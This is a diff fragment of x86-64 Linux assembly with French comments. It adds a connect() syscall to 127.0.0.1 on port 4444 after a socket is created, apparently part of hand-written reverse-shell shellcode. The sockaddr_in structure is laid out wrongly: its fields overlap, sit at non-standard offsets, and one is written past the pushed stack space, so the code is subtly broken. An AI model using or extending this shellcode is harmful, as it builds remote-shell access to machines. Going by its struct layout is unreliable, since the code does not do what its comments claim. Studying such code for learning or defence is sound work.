@@ -24,3 +24,16 @@ _start:
     xor     rdx, rdx        ; protocole = 0
     syscall
     mov     r12, rax        ; on sauvegarde le socket dans r12
+
+    ; connect(sockfd, {AF_INET, PORT, IP}, 16)
+    xor     rax, rax
+    push    rax             ; padding (8 octets à 0)
+    mov     dword [rsp+4], 0x0100007f  ; IP 127.0.0.1 en little-endian
+    mov     word  [rsp+6],  0x5C11     ; port 4444 en big-endian
+    mov     word  [rsp+8],  0x0002     ; AF_INET = 2 (IPv4)
+    mov     rsi, rsp        ; rsi = pointeur vers sockaddr_in
+    mov     rax, 42         ; syscall connect = 42
+    mov     rdi, r12        ; sockfd
+    mov     rdx, 16         ; taille de sockaddr_in
+    syscall
+
